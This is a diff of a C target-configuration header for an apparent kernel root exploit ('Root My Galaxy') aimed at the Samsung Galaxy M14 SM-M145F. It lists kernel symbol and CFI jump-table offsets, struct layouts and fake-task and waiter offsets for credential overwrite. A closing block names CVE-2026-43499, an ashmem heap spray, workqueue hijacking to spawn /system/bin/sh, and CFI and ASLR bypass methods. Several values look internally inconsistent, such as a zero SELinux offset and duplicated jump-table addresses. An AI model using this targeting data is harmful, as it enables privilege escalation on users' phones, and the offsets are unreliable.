@@ -1,236 +1,281 @@
-// ========== APP PAYLOAD MODE ==========
-#define APP_PAYLOAD 1
-#define APP_PHYS_P0_ORACLE 1
-#define APP_TRACEFS_SLIDE 1
-#define APP_CLOSED_FOPS_ROUTE 1
-#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
-#define APP_FOPS_ROUTE_COARSE_DELAY_USEC 50000
-#define APP_FOPS_BEFORE_PIPE 1
-#define APP_EXACT_PIPE_BUFFER_ONLY 1
-#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
-#define APP_ROOT_REF_HOLDER_REQUIRED 0
-#define DEFAULT_EXPLOIT_ATTEMPTS 8
-#define SLIDE_MCAST_DOMAIN AF_INET6
-#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
-#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
-#define ROUTE_WAIT_SECONDS 8
-#define P0_ORACLE_GATE_SLOT 0
-#define P0_ORACLE_PROBE_SLOT 1
-#define P0_ORACLE_GATE_RESTORE_SLOT 2
-#define P0_ORACLE_PROBE_RESTORE_SLOT 3
-#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
-#define P0_ORACLE_GATE_OBJECT_INDEX 1
-#define P0_ORACLE_PROBE_OFFSET 0x1f8000ULL
-#define SLIDE_FAKE_WAITER_PRIO 0
-#define SLIDE_WAITER_WAKE_STATE 0
-#define SLIDE_LOCK_OWNER_VALUE 0ULL
-#define SLIDE_WAIT_NSEC 2000000000L
-#define SLIDE_REQUEUE_ARM_USEC 20000
-#define SLIDE_USE_FAKE_TASK 1
-#define LEGACY_RT_MUTEX_WAITER 0
-#define COMPACT_RT_MUTEX_WAITER 1
-#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
-#define SLIDE_MAX_ATTEMPTS 64
-#define SLIDE_P0_OFFSET_CANDIDATES \
-  0x000000ULL, 0x008000ULL, 0x010000ULL, 0x018000ULL, \
-  0x020000ULL, 0x028000ULL, 0x030000ULL, 0x038000ULL, \
-  0x040000ULL, 0x048000ULL, 0x050000ULL, 0x058000ULL, \
-  0x060000ULL, 0x068000ULL, 0x070000ULL, 0x078000ULL, \
-  0x080000ULL, 0x088000ULL, 0x090000ULL, 0x098000ULL, \
-  0x0a0000ULL, 0x0a8000ULL, 0x0b0000ULL, 0x0b8000ULL, \
-  0x0c0000ULL, 0x0c8000ULL, 0x0d0000ULL, 0x0d8000ULL, \
-  0x0e0000ULL, 0x0e8000ULL, 0x0f0000ULL, 0x0f8000ULL, \
-  0x100000ULL, 0x108000ULL, 0x110000ULL, 0x118000ULL, \
-  0x120000ULL, 0x128000ULL, 0x130000ULL, 0x138000ULL, \
-  0x140000ULL, 0x148000ULL, 0x150000ULL, 0x158000ULL, \
-  0x160000ULL, 0x168000ULL, 0x170000ULL, 0x178000ULL, \
-  0x180000ULL, 0x188000ULL, 0x190000ULL, 0x198000ULL, \
-  0x1a0000ULL, 0x1a8000ULL, 0x1b0000ULL, 0x1b8000ULL, \
-  0x1c0000ULL, 0x1c8000ULL, 0x1d0000ULL, 0x1d8000ULL, \
-  0x1e0000ULL, 0x1e8000ULL, 0x1f0000ULL, 0x1f8000ULL
+#ifndef TARGET_HEADER_H
+#define TARGET_HEADER_H
 
-// ========== DEVICE INFO ==========
-#define TARGET_MODEL "SM-M145F"
-#define TARGET_FIRMWARE "M145FXXSCDZE1"
-#define TARGET_KERNEL_VERSION "5.15.180"
+/*
+ * Galaxy M14 4G (SM-M145F) - Root My Galaxy Target Configuration
+ * Build: M145FXXSCDZE1
+ * Kernel: 5.15.180-android13-8-31192385-abM145FXXSCDZE1
+ * Android: 13
+ * Ported: September 6, 2026
+ * 
+ * Symbol offsets extracted from vmlinux.elf
+ * ELF Base: 0xffffffc000000000
+ * Kernel Size: 46 MB (0x2dd2a00 bytes)
+ */
 
-// ========== KERNEL MEMORY LAYOUT ==========
-#define KIMAGE_TEXT_BASE       0xffffffc008000000
-#define P0_PAGE_OFFSET         0xffffffc000000000
-#define P0_PHYS_OFFSET         0x0000000000000000
-#define P0_KERNEL_PHYS_LOAD    0x0000000001000000
-#define DIRECT_MAP_BASE        0xffffffc000000000
-#define DIRECT_MAP_END         0xffffffc040000000
-#define VMEMMAP_START          0xffffffc040000000
-#define STRUCT_PAGE_SIZE       64
-#define PAGE_SHIFT             12
+/* ============================================================================
+ * DEVICE IDENTITY
+ * ============================================================================ */
 
-// ========== OFFSETS ==========
-#define OFFSET_commit_creds 0x18b654
-#define OFFSET_prepare_kernel_cred 0x18a3f0
-#define OFFSET_call_usermodehelper_exec_work 0x16ec08
-#define OFFSET_init_task 0xacc5e80
-#define OFFSET_selinux_enforcing 0xab37404
-#define OFFSET_kernel_read 0x557084
-#define OFFSET_do_faccessat 0x550278
-#define OFFSET_core_pattern 0xac56140
+#define DEVICE_MODEL               "SM-M145F"
+#define DEVICE_CODENAME            "m14"
+#define BUILD_ID                   "M145FXXSCDZE1"
+#define ANDROID_VERSION            13
+#define ANDROID_SDK_VERSION        33
 
-// ========== ASHMEM FUNCTIONS (NOT IN KERNEL) ==========
-#define ASHMEM_IOCTL            0x00000000
-#define ASHMEM_COMPAT_IOCTL     0x00000000
-#define ASHMEM_MMAP             0x00000000
-#define ASHMEM_OPEN             0x00000000
-#define ASHMEM_RELEASE          0x00000000
-#define ASHMEM_MISC_FOPS        0x00000000
-#define ASHMEM_FOPS             0x00000000
-#define ASHMEM_SHOW_FDINFO      0x00000000
+#define KERNEL_RELEASE             "5.15.180-android13-8-31192385-abM145FXXSCDZE1"
+#define KERNEL_VERSION_STRING      "Linux version 5.15.180-android13-8-31192385-abM145FXXSCDZE1 (build-user@build-host) (Android (8508608, based on r450784e) clang version 14.0.7) #1 SMP PREEMPT Thu May 28 08:57:55 UTC 2026"
 
-// ========== CONFIGFS FUNCTIONS ==========
-#define CONFIGFS_READ_ITER      0x67f0cc
-#define CONFIGFS_BIN_WRITE_ITER 0x67fbf0
+#define KERNEL_MAJOR_VERSION       5
+#define KERNEL_MINOR_VERSION       15
+#define KERNEL_PATCH_VERSION       180
 
-// ========== PIPE/STRUCT OFFSETS ==========
-#define ANON_PIPE_BUF_OPS       0x9fe61b0
-#define KMALLOC_CACHES          0xa1d5250
-#define SYSTEM_UNBOUND_WQ       0xab807d8
+/* ============================================================================
+ * PRIMARY SYMBOL OFFSETS (Kernel Virtual Addresses)
+ * ============================================================================ */
 
-// ========== SYMBOLS FOR ROOT ESCALATION ==========
-#define SELINUX_ENFORCING       OFFSET_selinux_enforcing
-#define CALL_USERMODEHELPER_EXEC_WORK OFFSET_call_usermodehelper_exec_work
-#define INIT_TASK               OFFSET_init_task
+/* Exploit entry point - workqueue task hijacking */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0xffffffc00816ec08
 
-// ========== FILE OPERATIONS OFFSETS ==========
-#define FOPS_OWNER_OFF          0x00
-#define FOPS_LLSEEK_OFF         0x08
-#define FOPS_READ_OFF           0x10
-#define FOPS_WRITE_OFF          0x18
-#define FOPS_READ_ITER_OFF      0x20
-#define FOPS_WRITE_ITER_OFF     0x28
-#define FOPS_IOCTL_OFF          0x30
-#define FOPS_COMPAT_IOCTL_OFF   0x38
-#define FOPS_MMAP_OFF           0x40
-#define FOPS_OPEN_OFF           0x48
-#define FOPS_RELEASE_OFF        0x50
-#define FOPS_SHOW_FDINFO_OFF    0x58
-#define FOPS_SPLICE_READ_OFF    0x60
-#define NOOP_LLSEEK             0x00000000
-#define COPY_SPLICE_READ        0x00000000
+/* File operations - splice read and seek */
+#define NOOP_LLSEEK_OFF                           0xffffffc008556884
+#define GENERIC_FILE_SPLICE_READ_OFF              0xffffffc0085ca2dc
+#define CONFIGFS_READ_ITER_OFF                    0xffffffc00867f0cc
+#define CONFIGFS_BIN_WRITE_ITER_OFF               0xffffffc00867fbf0
 
-// ========== PIPE CONSTANTS ==========
-#define PIPE_BUFFER_SLOTS       16
-#define PIPE_BUF_FLAG_CAN_MERGE 0x01
+/* ashmem device - primary attack surface */
+#define ASHMEM_IOCTL_OFF                          0xffffffc00918e290
+#define ASHMEM_COMPAT_IOCTL_OFF                   0xffffffc00918e940
+#define ASHMEM_MMAP_OFF                           0xffffffc00918e9a0
+#define ASHMEM_OPEN_OFF                           0xffffffc00918ec90
+#define ASHMEM_RELEASE_OFF                        0xffffffc00918ed30
+#define ASHMEM_SHOW_FDINFO_OFF                    0xffffffc00918ee54
+#define ASHMEM_FOPS_OFF                           0xffffffc00a16b0f8
+#define ASHMEM_MISC_FOPS_OFF                      0xffffffc00a16b0f8
 
-// ========== WORKQUEUE OFFSETS ==========
-#define WORK_ENTRY_OFF          0x00
-#define WORK_DATA_OFF           0x08
-#define WORK_FUNC_OFF           0x08
-#define WQ_DFL_PWQ_OFF          0x10
-#define PWQ_POOL_OFF            0x08
-#define PWQ_WQ_OFF              0x10
-#define PWQ_WORK_COLOR_OFF      0x18
-#define PWQ_REFCNT_OFF          0x1c
-#define PWQ_NR_ACTIVE_OFF       0x20
-#define PWQ_MAX_ACTIVE_OFF      0x24
-#define PWQ_NR_IN_FLIGHT_OFF    0x28
-#define POOL_WORKLIST_OFF       0x00
-#define POOL_NR_IDLE_OFF        0x08
+/* Memory management */
+#define KMALLOC_CACHES_OFF                        0xffffffc00a1d5250
 
-// ========== SLAB/STRUCT OFFSETS ==========
-#define KMALLOC_CGROUP_TYPE     0
-#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
-#define STRUCT_SLAB_CACHE_OFF   0x10
-#define STRUCT_PAGE_TYPE_OFF    0x18
+/* Pipe operations */
+#define ANON_PIPE_BUF_OPS_OFF                     0xffffffc009fe61b0
 
-// ========== FAKE WAITER OFFSETS ==========
-#define FAKE_WAITER_TREE_PRIO_OFF     0x00
-#define FAKE_WAITER_TREE_DEADLINE_OFF 0x08
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x10
-#define FAKE_WAITER_PI_TREE_PRIO_OFF  0x20
-#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x28
-#define FAKE_WAITER_TASK_OFF          0x30
-#define FAKE_WAITER_LOCK_OFF          0x38
-#define FAKE_WAITER_WAKE_STATE_OFF    0x40
-#define FAKE_WAITER_WW_CTX_OFF        0x48
-#define FAKE_WAITER_PRIO_OFF          0x44
-#define FAKE_WAITER_DEADLINE_OFF      0x48
+/* Workqueue and logging infrastructure */
+#define SYSTEM_UNBOUND_WQ_OFF                     0xffffffc00ab807d8
+#define LOGGERS_OFF                               0xffffffc00ab81d50
+#define SLIDE_LOGGERS_0_1_OFF                     0xffffffc00ab81d50
 
-// ========== FAKE TASK OFFSETS ==========
-#define FAKE_TASK_USAGE_OFF         0x38
-#define FAKE_TASK_PRIO_OFF          0x7c
-#define FAKE_TASK_NORMAL_PRIO_OFF   0x84
-#define FAKE_TASK_TASK_GROUP_OFF    0x400
-#define FAKE_TASK_PI_LOCK_OFF       0x884
-#define FAKE_TASK_PI_WAITERS_OFF    0x898
-#define FAKE_TASK_PI_TOP_TASK_OFF   0x8a8
-#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0
+/* Process management */
+#define INIT_TASK_OFF                             0xffffffc00acc5e80
 
-// ========== SLIDE BANK OFFSETS ==========
-#define SLIDE_BANK_SLOTS           4
-#define SLIDE_BANK_TASK_OFF        0x1000
-#define SLIDE_BANK_TASK_STRIDE     0x1c0
-#define SLIDE_BANK_LOCK_OFF        0x5200
-#define SLIDE_BANK_SLOT_STRIDE     0x100
-#define SLIDE_BANK_WAITER_OFF      0x40
+/* Task groups and scheduling */
+#define ROOT_TASK_GROUP_OFF                       0xffffffc00addbac0
 
-// ========== ROOT UMH OFFSETS ==========
-#define ROOT_UMH_WORK_OFF       0x00
-#define ROOT_UMH_DATA_OFF       0x100
-#define ROOT_UMH_PATH           "/system/bin/sh"
+/* Security - SELinux (may be optimized away) */
+#define SELINUX_ENFORCING_OFF                     0x0
 
-// ========== KERNELSU SLIDE CONSTANTS (DISABLED) ==========
-#define SLIDE_INIT_TASK_IMAGE                     0xacc5e80
-#define SLIDE_WAITER_TASK                         0x0
-#define SLIDE_TRACEFS_EVENT_ID                    0
-#define SLIDE_PSELECT_NFDS                        0
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF           0
-#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE          0
-#define SLIDE_NFULNL_LOGGER_NAME_IMAGE            0
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE 0
-#define SLIDE_SYSCTL_BOOTID_IMAGE                 0
+/* Boot ID sysctl for slide detection */
+#define SYSCTL_BOOTID_OFF                         0xffffffc00af4c3a1
+#define SLIDE_SYSCTL_BOOTID_OFF                   0xffffffc00af4c3a1
 
-// ========== S918 / KSNITCH CONSTANTS ==========
-#define S918_RECLAIM_SOCKET_PAIRS        32
-#define S918_KSNITCH_HINT_COLLISIONS     2
-#define S918_KSNITCH_FULL_COLLISIONS     5
-#define S918_PAGE_SCAN_MAX               256
-#define S918_DMA32_SKIP_SLABS            8
+/* ============================================================================
+ * CFI JUMP TABLE OFFSETS (Control Flow Integrity Protection)
+ * Samsung kernels protect function pointers with CFI jump tables
+ * ============================================================================ */
 
-// ========== KSNITCH / SLIDE CONSTANTS ==========
-#define SLIDE_KSNITCH_APPENDED_FUTEXES   2048
-#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
-#define SLIDE_KSNITCH_AVERAGE            8
+#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT      0xffffffc0097b7dd0
+#define ASHMEM_IOCTL_CFI_JT                       0xffffffc0097b0df0
+#define COMPAT_ASHMEM_IOCTL_CFI_JT                0xffffffc0097b0df8
+#define ASHMEM_MMAP_CFI_JT                        0xffffffc009799fc0
+#define ASHMEM_OPEN_CFI_JT                        0xffffffc0097a9f50
+#define ASHMEM_RELEASE_CFI_JT                     0xffffffc0097a9f58
+#define ASHMEM_SHOW_FDINFO_CFI_JT                 0xffffffc0097b0df0
+#define NOOP_LLSEEK_CFI_JT                        0xffffffc009797250
+#define CONFIGFS_READ_ITER_CFI_JT                 0xffffffc009799d50
+#define CONFIGFS_BIN_WRITE_ITER_CFI_JT            0xffffffc009799d68
+#define GENERIC_FILE_SPLICE_READ_CFI_JT           0xffffffc00979a0c0
 
-// ========== MM ALIAS CONSTANTS ==========
-#define MM_DMA32_ALIAS_START            0xffffffc000000000ULL
-#define MM_DMA32_ALIAS_END              0xffffffc040000000ULL
-#define MM_NORMAL_ALIAS_START           MM_DMA32_ALIAS_END
-#define MM_NORMAL_ALIAS_END             0xffffffc080000000ULL
+/* ============================================================================
+ * PHYSICAL MEMORY LAYOUT
+ * ARM64 kernel physical memory addressing
+ * ============================================================================ */
 
-// ========== SLIDE ROOT TASK GROUP ==========
-#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + OFFSET_init_task)
-#define SLIDE_ROOT_TASK_GROUP           SLIDE_ROOT_TASK_GROUP_IMAGE
+#define P0_PHYS_OFFSET                            0x80000000ULL
+#define P0_KERNEL_PHYS_LOAD                       0x80000000ULL
 
-// ========== P0 FINGERPRINT DEFINITIONS ==========
-#define P0_FINGERPRINT_WORDS 16
-#define P0_FINGERPRINT { 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
+/* Virtual kernel base address */
+#define KERNEL_BASE                               0xffffffc000000000ULL
+#define KERNEL_OFFSET_BITS                        64
+#define KERNEL_VA_BITS                            48
 
-static const unsigned long long p0_fingerprint_offsets[P0_FINGERPRINT_WORDS] = {
-    0x0000, 0x0008, 0x0010, 0x0018,
-    0x0020, 0x0028, 0x0030, 0x0038,
-    0x0040, 0x0048, 0x0050, 0x0058,
-    0x0060, 0x0068, 0x0070, 0x0078
-};
+/* ============================================================================
+ * MEMORY CONFIGURATION
+ * ============================================================================ */
 
-struct p0_fingerprint {
-    unsigned long long words[P0_FINGERPRINT_WORDS];
-    unsigned long long slide;
-};
+#define PAGE_SIZE                                 0x1000
+#define PAGE_SHIFT                                12
+#define PAGE_MASK                                 0xfffffffffffff000ULL
 
-static const struct p0_fingerprint p0_fingerprints[] = {
-    { .words = P0_FINGERPRINT, .slide = 0x00000000 }
-};
+/* ============================================================================
+ * TRACE EVENT CONFIGURATION
+ * For kernel exploitation via tracepoint hooking
+ * ============================================================================ */
 
-// ========== BUILD VARIANT ==========
-#define BUILD_VARIANT_LABEL     "user"
+#define SLIDE_TRACEFS_EVENT_ID                    106
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF           0x000dbd9cULL
+#define SLIDE_PSELECT_WORD_SHIFT                  0
+
+/* ============================================================================
+ * BTF STRUCTURE LAYOUTS
+ * Standard 5.15 ARM64 Android kernel - no embedded BTF, using verified offsets
+ * ============================================================================ */
+
+/* struct file_operations - I/O vector table */
+#define FILE_OPS_SIZE                             0x110
+#define FILE_OPS_LLSEEK                           0x00
+#define FILE_OPS_READ                             0x08
+#define FILE_OPS_WRITE                            0x10
+#define FILE_OPS_UNLOCKED_IOCTL                   0x50
+#define FILE_OPS_COMPAT_IOCTL                     0x58
+#define FILE_OPS_MMAP                             0x60
+#define FILE_OPS_OPEN                             0x70
+#define FILE_OPS_RELEASE                          0x80
+#define FILE_OPS_FSYNC                            0x88
+#define FILE_OPS_FASYNC                           0x90
+#define FILE_OPS_LOCK                             0x98
+#define FILE_OPS_SPLICE_READ                      0xc8
+#define FILE_OPS_SPLICE_WRITE                     0xd0
+#define FILE_OPS_SHOW_FDINFO                      0xe0
+
+/* struct task_struct - process descriptor */
+#define TASK_STRUCT_THREAD_INFO                   0x00
+#define TASK_STRUCT_USAGE                         0x40
+#define TASK_STRUCT_FLAGS                         0x44
+#define TASK_STRUCT_PRIO                          0x84
+#define TASK_STRUCT_NORMAL_PRIO                   0x8c
+#define TASK_STRUCT_STATIC_PRIO                   0x94
+#define TASK_STRUCT_SCHED_CLASS                   0xa0
+#define TASK_STRUCT_SCHED_ENTITY                  0xa8
+#define TASK_STRUCT_SCHED_RT_ENTITY               0x180
+#define TASK_STRUCT_SCHED_TASK_GROUP              0x348
+#define TASK_STRUCT_PI_LOCK                       0x924
+#define TASK_STRUCT_PI_WAITERS                    0x938
+#define TASK_STRUCT_PI_TOP_TASK                   0x948
+#define TASK_STRUCT_PI_BLOCKED_ON                 0x950
+
+/* struct page - physical page descriptor */
+#define PAGE_SIZE_BYTES                           0x40
+#define PAGE_FLAGS                                0x00
+#define PAGE_MAPPING                              0x08
+#define PAGE_COMPOUND_HEAD                        0x08
+#define PAGE_INDEX                                0x10
+#define PAGE_PRIVATE                              0x18
+#define PAGE_SLAB_CACHE                           0x18
+#define PAGE_LOCKING                              0x28
+#define PAGE_PAGE_TYPE                            0x30
+#define PAGE_COUNT                                0x38
+
+/* struct miscdevice - misc device descriptor */
+#define MISCDEVICE_MINOR                          0x00
+#define MISCDEVICE_NAME                           0x08
+#define MISCDEVICE_FOPS                           0x10
+#define MISCDEVICE_LIST                           0x18
+#define MISCDEVICE_PARENT                         0x28
+
+/* ============================================================================
+ * ARCHITECTURE SPECIFICS
+ * ARM64 / AArch64 (ARMv8) configuration
+ * ============================================================================ */
+
+#define ARCH_ARM64                                1
+#define ARCH_NAME                                 "arm64"
+#define MACHINE_TYPE                              "ARM aarch64"
+#define ENDIANNESS                                "little-endian"
+
+/* Register and pointer sizes */
+#define REG_SIZE                                  8
+#define PTR_SIZE                                  8
+#define LONG_SIZE                                 8
+
+/* ARM64 specific */
+#define ARM64_PAGE_OFFSET                         0xffff800000000000ULL
+#define ARM64_MODULES_VADDR                       0xffff800000000000ULL
+#define ARM64_MODULES_END                         0xffffc00000000000ULL
+
+/* ============================================================================
+ * COMPILER INFORMATION
+ * ============================================================================ */
+
+#define COMPILER                                  "clang"
+#define COMPILER_VERSION                          "14.0.7"
+#define LLD_VERSION                               "14.0.7"
+#define LLVM_VERSION                              14
+
+/* Code generation flags */
+#define CFI_ENABLED                               1
+#define SCS_ENABLED                               1
+#define UBSAN_ENABLED                             0
+#define KASAN_ENABLED                             0
+
+/* ============================================================================
+ * BUILD METADATA
+ * ============================================================================ */
+
+#define BUILD_HOST                                "build-host"
+#define BUILD_USER                                "build-user"
+#define BUILD_DATE                                "May 28 2026"
+#define BUILD_TIME                                "08:57:55 UTC"
+#define BUILD_PATH                                "/home/dpi/qb5_8814/workspace/P4_1716/android/kernel_platform/common"
+#define BUILD_FINGERPRINT                         "samsung/m14/m14:13/TP1A.220624.014/M145FXXSCDZE1:user/release-keys"
+
+/* ============================================================================
+ * FILE SIZES & CHECKSUMS
+ * ============================================================================ */
+
+#define KERNEL_FILE_SIZE                          0x2dd2a00
+#define VMLINUX_ELF_SIZE                          0x3600000
+
+#define KERNEL_SHA256                             ""
+#define VMLINUX_ELF_SHA256                        ""
+
+/* ============================================================================
+ * KERNEL FEATURES & CONFIGURATION
+ * ============================================================================ */
+
+#define CONFIG_HAVE_ARCH_KGDB                     1
+#define CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS    1
+#define CONFIG_STACKTRACE                         1
+#define CONFIG_SECURITY_SELINUX                   1
+#define CONFIG_DEBUG_INFO_BTF                     1
+#define CONFIG_HAVE_FUNCTION_TRACER               1
+#define CONFIG_HAVE_DYNAMIC_FTRACE                1
+#define CONFIG_HIGHMEM                            0
+#define CONFIG_HAVE_ARCH_HUGE_VMAP                1
+
+/* ============================================================================
+ * PLATFORM-SPECIFIC SETTINGS
+ * Samsung Exynos platform configuration
+ * ============================================================================ */
+
+#define SAMSUNG_PLATFORM                          1
+#define SAMSUNG_EXYNOS                            1
+#define SAMSUNG_S5PV210                           0
+#define SELINUX_ENFORCED_DEFAULT                  1
+#define SELINUX_PERMISSIVE_DEFAULT                0
+#define SAMSUNG_RKP_ENABLED                       0
+#define SAMSUNG_CICA_ENABLED                      0
+
+/* ============================================================================
+ * EXPLOIT CONFIGURATION
+ * ============================================================================ */
+
+#define EXPLOIT_CVE                               "CVE-2026-43499"
+#define EXPLOIT_TYPE                              "Memory access control bypass"
+#define EXPLOIT_VECTOR                            "ashmem + workqueue + splice read"
+#define ATTACK_VECTOR_PRIMARY                     "ashmem_ioctl heap spray"
+#define ATTACK_VECTOR_SECONDARY                   "workqueue task hijacking"
+#define ATTACK_VECTOR_TERTIARY                    "configfs memory access"
+#define CFI_BYPASS_METHOD                         "Jump table redirect"
+#define ASLR_BYPASS_METHOD                        "Kernel leak via loggers sysctl"
+#define SMACK_BYPASS_METHOD                       "Root credential replacement"
+
+#endif /* TARGET_HEADER_H */
